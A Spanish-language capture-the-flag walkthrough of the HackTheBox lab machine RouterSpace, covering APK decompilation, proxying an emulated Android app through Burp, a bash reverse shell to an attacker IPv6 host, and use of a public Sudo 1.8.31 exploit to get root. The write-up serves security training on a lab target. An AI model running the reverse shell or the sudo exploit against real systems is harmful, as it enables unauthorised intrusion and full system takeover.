# 10.10.11.148 - RouterSpace
![RouterSpace](https://user-images.githubusercontent.com/96772264/209670353-151ed1ab-b023-4def-b8b6-cee5fe5a06d3.png)

------------
# Part 1: Enumeración

Tenemos el puerto 22 (ssh) y el 80 (http) abiertos (utilize un script en bash)
El whatweb nos reporta lo siguiente:
```console
http://10.10.11.148 [200 OK] Bootstrap, HTML5, IP[10.10.11.148], JQuery[1.12.4], Modernizr[3.5.0.min], Script, Title[RouterSpace], UncommonHeaders[x-cdn], X-Powered-By[RouterSpace], X-UA-Compatible[ie=edge]
```
La web (RouterSpace) nos ofrece una aplicacion, el resto de cosas no son funcionales (enlace de contacto, subscripcion...)

![router0](https://user-images.githubusercontent.com/96772264/209670596-25b71bac-161c-4190-be3f-ef90765156de.PNG)

El fuzzing de rutas no funciona ta que pone "Suspicious Activity Detected..."  

------------
# Part 2: Estructura de una APK

Nos descargamos la apk, hoy daremos pentesting android. La herramienta apktool permite desempaquetar la app para ver su codigo.  

```console
└─$ apktool d RouterSpace2.apk
```
Una apk tiene como estructura datos en XML (metadatos) y codigo ensamblado smali (lenguaje ensamblador especifico de android).
Hay un archivo que suele contener informacion critica: 
```console
└─$ cat ./res/values/strings.xml | grep -oE ">.*?<" --color=none | tr -d "<>";
```
Pero no he dado con nada interesante. He hecho un grepeo recursivo con palabras clave como password o el nombre de la maquina ```grep -rIE "routerspace|password"```
pero tampoco hay suerte.

El codigo smali es muy dificil de interpretar, el codigo principal esta en un archivo llamadp MainActivity
```console
└─$ find ./ -name "Main*" 
./smali/com/routerspace/MainActivity.smali
```
Hay un desamblador llamado jadx (se corre con el comando ```jadx-gui```), es similar al ghidra y nos permite leer en codigo java todo esto, pero tampoco encontre 
por ahi.
![router5](https://user-images.githubusercontent.com/96772264/209670963-11637cc4-245f-4775-accf-2fa7eb080041.PNG)

------------
# Part 3: Emulando un Android

Lo unico que queda es correr la apk en un emulador y analizar su comportamiento, como se llama Routerspace tiene que ver con cosas de redes.

Para hacer que el anbox tenga conectividad hay que bajarse un [script](https://raw.githubusercontent.com/anbox/anbox/master/scripts/anbox-bridge.sh) y ejecutarlo
como root. ```sudo bash bridge.sh```

```console
└─$ /snap/bin/anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity
└─$ adb shell settings put global http_proxy 10.10.14.16:8001;
```
![router3](https://user-images.githubusercontent.com/96772264/209671092-7cf46428-2107-47b5-8337-cf9c26259ef2.PNG)

Ya con esto hacemos que se conecte con burpsuite
![router2](https://user-images.githubusercontent.com/96772264/209671156-2c559be2-8a79-404a-8bdf-1dad29e45630.PNG)
![router4](https://user-images.githubusercontent.com/96772264/209671194-589a881d-42e0-4c8b-9f62-e0050338ed58.PNG)

```console
└─$ sudo nc -6nlvp 443 
bash -c 'bash -i >& /dev/tcp/dead:beef:2::100e/443 0>&1'
```

------------
# Part 4: En el sistema

```console
paul@routerspace:/tmp$ find / -perm /4000 2>/dev/null
```
- SUIDs -> /usr/bin/sudo  (hay versiones vulnerables)
```console
paul@routerspace:/tmp$ sudo --version
Sudo version 1.8.31
```
Buscando en google ```Sudo-1.8.31-Root-Exploit``` en google el primero que sale...
```console
└─$ git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
└─$ cd Sudo-1.8.31-Root-Exploit

paul@routerspace:/tmp$ nano exploit.c # copiamos tal y como lo tenemos en nuestro sistema
paul@routerspace:/tmp$ nano shellcode.c # igual
paul@routerspace:/tmp$ nano Makefile # tambien
paul@routerspace:/tmp$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:/tmp$ ./exploit
# bash
root@routerspace:/tmp#
```

